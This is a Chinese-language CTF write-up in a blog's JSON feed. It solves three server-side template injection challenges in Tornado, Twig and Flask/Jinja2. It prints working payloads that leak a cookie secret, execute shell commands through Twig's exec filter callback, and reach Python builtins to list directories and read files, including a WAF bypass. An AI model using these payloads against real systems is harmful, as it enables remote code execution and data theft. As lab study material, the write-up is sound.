{
    "version": "https://jsonfeed.org/version/1",
    "title": "FanqieのBlog • All posts by \"ssti\" tag",
    "description": "学习博客",
    "home_page_url": "http://example.com",
    "items": [
        {
            "id": "http://example.com/2021/06/28/(ctfwp)buu%E4%B8%ADssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/",
            "url": "http://example.com/2021/06/28/(ctfwp)buu%E4%B8%ADssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/",
            "title": "(ctfwp)buu中ssti模板注入",
            "date_published": "2021-06-28T12:51:13.874Z",
            "content_html": "<p>学习文章在前一篇</p>\n<p><span id=\"more\"></span></p>\n<h1 id=\"一-护网杯-2018easy_tornado\"><a class=\"anchor\" href=\"#一-护网杯-2018easy_tornado\">#</a> 一、[护网杯 2018] easy_tornado</h1>\n<p>打开题目，只有三个链接，如图，</p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDYvMjgvSnBTcm5xY3U5UXpnUmsxLnBuZw==\">https://i.loli.net/2021/06/28/JpSrnqcu9QzgRk1.png</span>&quot; alt=&quot;1.1.png&quot; style=&quot;zoom: 33%;&quot; /&gt;</p>\n<p>依次点开</p>\n<p><img data-src=\"https://i.loli.net/2021/06/28/GUD9pRAlmoFywSE.png\" alt=\"1.2.png\"></p>\n<p><img data-src=\"https://i.loli.net/2021/06/28/7girIkdaASC4O1x.png\" alt=\"1.3.png\"></p>\n<p><img data-src=\"https://i.loli.net/2021/06/28/dZghu8sTqkKbjzC.png\" alt=\"1.4.png\"></p>\n<p>根据每个网址的链接和 flag 页面的内容可以推测，flag 应该是</p>\n<pre><code>filename=/fllllllllllllag&amp;filehash=md5(cookie_secret+md5(filename))\n</code></pre>\n<p>这种格式。</p>\n<p>所以本题的关键在 cookie_secret</p>\n<p>根据第二个链接内容，百度 render 可以发现，render () 是 tornado 里的函数，可以生成 html 模板。</p>\n<p>我们对网站进行尝试注入，看是否有注入点</p>\n<pre><code>filename=/fllllllllllllag&amp;filehash=&#123;&#123;7*7&#125;&#125;\n</code></pre>\n<p><img data-src=\"https://i.loli.net/2021/06/28/Q3sXjMgDWcJ6C5P.png\" alt=\"1.5.png\"></p>\n<p>发现网页报错，但明显还能尝试注入</p>\n<pre><code>error?msg=&#123;&#123;7*7&#125;&#125;    和        error?msg=&#123;&#123;7&#125;&#125;\n</code></pre>\n<p>发现当输入 7*7 时，返回 orz；输入 7 时，返回 7</p>\n<p>说明可以注入，但 * 可能被过滤</p>\n<p>因为存在注入点，所以我们需要寻找 cookie_secret 路径</p>\n<p>百度发现，其存在位置为 handler.settings</p>\n<p><img data-src=\"https://i.loli.net/2021/06/28/qdHivX4ErBChAVl.png\" alt=\"1.6.png\"></p>\n<p>进行注入得</p>\n<p><img data-src=\"https://i.loli.net/2021/06/28/JmMcOqjIdl3gPoz.png\" alt=\"1.7.png\"></p>\n<pre><code>'cookie_secret': '3b278e82-468b-487a-8cd2-bcf53c8a19d0'&#125;\n</code></pre>\n<p>因为 md5 (filename)=md5 (/fllllllllllllag)=3bf9f6cf685a6dd8defadabfb41a03a1</p>\n<p>拼接后加密得 2bd5cf6fe358fa26518f4bca650e3a79</p>\n<p><img data-src=\"https://i.loli.net/2021/06/28/nIfBHhM9GJyP4qo.png\" alt=\"1.8.png\"></p>\n<p>最后输入 payload 进行查询，得到 flag</p>\n<pre><code>fllllllllllllag&amp;filehash=2bd5cf6fe358fa26518f4bca650e3a79\n</code></pre>\n<p><img data-src=\"https://i.loli.net/2021/06/28/YGEbvcOZQahAgXN.png\" alt=\"1.9.png\"></p>\n<p 5d8b767c-07af-46ff-831d-30e9c7f4d32b>flag</p>\n<h1 id=\"二-bjdctf2020cookie-is-so-stable\"><a class=\"anchor\" href=\"#二-bjdctf2020cookie-is-so-stable\">#</a> 二、[BJDCTF2020] Cookie is so stable</h1>\n<p>打开题目，需要输入 id，随便输入后发现找不到 flag</p>\n<p>尝试注入</p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDYvMjgvZDR1ZWd0bm9aMjNNaXhzLnBuZw==\">https://i.loli.net/2021/06/28/d4uegtnoZ23Mixs.png</span>&quot; alt=&quot;2.1.png&quot; style=&quot;zoom:50%;&quot; /&gt;</p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDYvMjgvUFFoNFhsYlNLSE5FUk9JLnBuZw==\">https://i.loli.net/2021/06/28/PQh4XlbSKHNEROI.png</span>&quot; alt=&quot;2.2.png&quot; style=&quot;zoom:50%;&quot; /&gt;</p>\n<p>发现有明显的注入漏洞，又因为结构为 49 且基于 php，可以推测出模板为 twig。根据源码提示进行抓包，发现 uesr 是注入点</p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDYvMjgvZkhMb1dpQjhVMXNiWWszLnBuZw==\">https://i.loli.net/2021/06/28/fHLoWiB8U1sbYk3.png</span>&quot; alt=&quot;2.3.png&quot; style=&quot;zoom:50%;&quot; /&gt;</p>\n<p>直接百度或根据上一篇文章的 payload 进行注入</p>\n<pre><code>&#123;&#123;_self.env.registerUndefinedFilterCallback(\"exec\")&#125;&#125;&#123;&#123;_self.env.getFilter(\"cat /flag\")&#125;&#125;\n</code></pre>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDYvMjgvU2ptaEZheG5Jd0RlUmZRLnBuZw==\">https://i.loli.net/2021/06/28/SjmhFaxnIwDeRfQ.png</span>&quot; alt=&quot;2.4.png&quot; style=&quot;zoom:50%;&quot; /&gt;</p>\n<p d7ef7d9d-6ba4-4dd5-88ec-33500d9b2ad3>得 flag</p>\n<h1 id=\"三-gyctf2020flaskapp\"><a class=\"anchor\" href=\"#三-gyctf2020flaskapp\">#</a> 三、[GYCTF2020] FlaskApp</h1>\n<p>进去是这个页面，提示里没有信息</p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDYvMjgvVUhrQWR3czVaclhmZ1FiLnBuZw==\">https://i.loli.net/2021/06/28/UHkAdws5ZrXfgQb.png</span>&quot; alt=&quot;3.1.png&quot; style=&quot;zoom:50%;&quot; /&gt;</p>\n<p>随便尝试后，发现加密中可以注入代码，解密就能得到值：</p>\n<p>注入 14 得 e3s3Kzd9fQ== 翻译得 14</p>\n<p>但再注入 49 时，加密得 e3s3Kjd9fQ==</p>\n<p>再解密却得</p>\n<p><img data-src=\"https://i.loli.net/2021/06/28/FkX7dReBKsACnqS.png\" alt=\"3.2.png\"></p>\n<p>说明存在过滤</p>\n<p>尝试注入查找目录</p>\n<pre><code>&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__=='catch_warnings' %&#125;&#123;&#123; c.__init__.__globals__['__builtins__'].eval(\"__import__('os').popen('ls /').read()\")&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;\n</code></pre>\n<p><img data-src=\"https://i.loli.net/2021/06/28/y8W4mGaiohPDg3J.png\" alt=\"3.3.png\"></p>\n<p>发现又被过滤了，于是考虑查看源码，在解密中随便输入进入 debug：</p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDYvMjgvYUVwWTVQU0RNbEtUd0hmLnBuZw==\">https://i.loli.net/2021/06/28/aEpY5PSDMlKTwHf.png</span>&quot; alt=&quot;3.4.png&quot; style=&quot;zoom:50%;&quot; /&gt;</p>\n<p>可以发现，在输出结果时有过滤，存在于 app.py 的 waf 中，百度一下 payload，尝试读取文件</p>\n<pre><code>&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__=='catch_warnings' %&#125;&#123;&#123; c.__init__.__globals__['__builtins__'].open('app.py', 'r').read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;\n</code></pre>\n<p><img data-src=\"https://i.loli.net/2021/06/28/W8zvhqFBGKiSnP5.png\" alt=\"3.5.png\"></p>\n<p>找到了被过滤的字符</p>\n<p>拼接 os 和 import 构造 payload 寻找目录：</p>\n<pre><code>&#123;&#123;''.__class__.__bases__[0].__subclasses__()[75].__init__.__globals__['__builtins__']['__imp'+'ort__']('o'+'s').listdir('/')&#125;&#125;\n</code></pre>\n<p><img data-src=\"https://i.loli.net/2021/06/28/mVvwtf8ODhnukRW.png\" alt=\"3.6.png\"></p>\n<p>然后拼接 flag，读取文件：</p>\n<pre><code>&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__=='catch_warnings' %&#125;&#123;&#123; c.__init__.__globals__['__builtins__'].open('/this_is_the_fl'+'ag.txt','r').read()&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;\n</code></pre>\n<p><img data-src=\"https://i.loli.net/2021/06/28/QqiFUklB1j2MESu.png\" alt=\"3.7.png\"></p>\n<p f8cc4e99-1ec3-49f2-b0be-b92686d4ff31>得到 flag</p>\n<h1 id=\"四-部分payload总结快速使用\"><a class=\"anchor\" href=\"#四-部分payload总结快速使用\">#</a> 四、部分 payload 总结，快速使用</h1>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly8yNzQwOTA4OTExLmdpdGh1Yi5pby8yMDIxLzA2LzI4L2J1dSVFNCVCOCVBRCVFNyU5QSU4NCVFOSU4MyVBOCVFNSU4OCU4NnNzdGklRTglQTclQTMlRTklQTIlOTglRTglQkYlODclRTclQTglOEIv\">buu 中的部分 ssti 解题过程</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly94aTRvcjB1amkuZ2l0aHViLmlvLzIwMTkvMDEvMTUvZmxhc2slRTQlQjklOEJzc3RpJUU2JUE4JUExJUU2JTlEJUJGJUU2JUIzJUE4JUU1JTg1JUE1LyMlRTYlOTQlQkIlRTUlODclQkI=\">flask 之 ssti 模板注入</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81NDUxNTgzNi9hcnRpY2xlL2RldGFpbHMvMTEzNzc4MjMz\">ssti 详解与例题以及绕过 payload 大全</span></p>\n",
            "tags": [
                "SSTI"
            ]
        }
    ]
}